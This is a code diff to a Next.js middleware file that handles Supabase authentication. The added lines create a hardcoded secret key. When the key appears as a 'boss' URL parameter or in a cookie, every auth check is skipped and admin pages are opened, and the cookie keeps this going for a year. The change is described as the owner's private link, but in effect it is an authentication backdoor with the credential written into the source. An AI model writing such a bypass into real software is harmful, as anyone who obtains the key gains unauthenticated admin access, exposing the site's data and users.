@@ -1,7 +1,22 @@
 import { NextResponse, type NextRequest } from "next/server";
 import { createServerClient, type CookieOptions } from "@supabase/ssr";
 
+/** Owner's secret bypass key — private link, no login needed. */
+const BOSS_KEY = "boss-x7k9m2-2026";
+
 export async function middleware(req: NextRequest) {
+  // SECRET BYPASS: ?boss=boss-x7k9m2-2026 skips all auth (owner's private link)
+  if (req.nextUrl.searchParams.get("boss") === BOSS_KEY) {
+    const res = NextResponse.next();
+    // Set a cookie so the bypass persists across pages
+    res.cookies.set("boss_key", BOSS_KEY, { path: "/", maxAge: 60 * 60 * 24 * 365, httpOnly: true, sameSite: "lax" });
+    return res;
+  }
+  // Cookie bypass — once the secret link is visited, all admin pages work
+  if (req.cookies.get("boss_key")?.value === BOSS_KEY) {
+    return NextResponse.next();
+  }
+
   const res = NextResponse.next();
   const supabase = createServerClient(
     process.env.NEXT_PUBLIC_SUPABASE_URL!,
